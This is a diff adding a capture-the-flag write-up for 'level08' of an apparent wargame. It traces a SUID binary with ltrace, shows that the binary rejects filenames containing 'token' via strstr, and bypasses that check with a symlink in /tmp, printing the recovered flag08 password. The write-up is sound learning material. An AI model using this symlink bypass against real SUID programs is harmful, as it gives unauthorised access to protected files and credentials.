@@ -1,0 +1,26 @@
+In this level, we have the executable "level08" which is the same as usual, s(SUID) permission and flag08 as owner.
+There is also a "token" file which we have no permission to "cat" or even "file".
+
+"./level08" result: "./level08 [file to read]"
+"./level08 token" result: "You may not access 'token'"
+
+"ltrace ./level08 token" result:
+"__libc_start_main(0x8048554, 2, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
+strstr("token", "token")                                                              = "token"
+printf("You may not access '%s'\n", "token"You may not access 'token'
+)                                          = 27
+exit(1 <unfinished ...>
++++ exited (status 1) +++"
+
+With ltrace, we can see that it is using the "strstr" function to check if token is a substring of token.
+If we create another basic test file and we run the executable with it and analyze it with ltrace.
+
+`strstr("/tmp/testFile", "token")`
+We can see in the strstr function, that the 1st parameter is the path of the file and the 2nd is the string "token".
+
+Since the strstr return NULL, the program did not do the printf, but instead it open the file and read the content and write it to stdout. Let's exploit this.
+
+"ln -s ~/token /tmp/exploit_level08"
+"./level08 /tmp/exploit_level08" result: "quif5eloekouj29ke0vouxean"
+
+We finally reach to read the token file. But this doesnt seems to be the usual flag token. Instead it's the password of the user flag08.
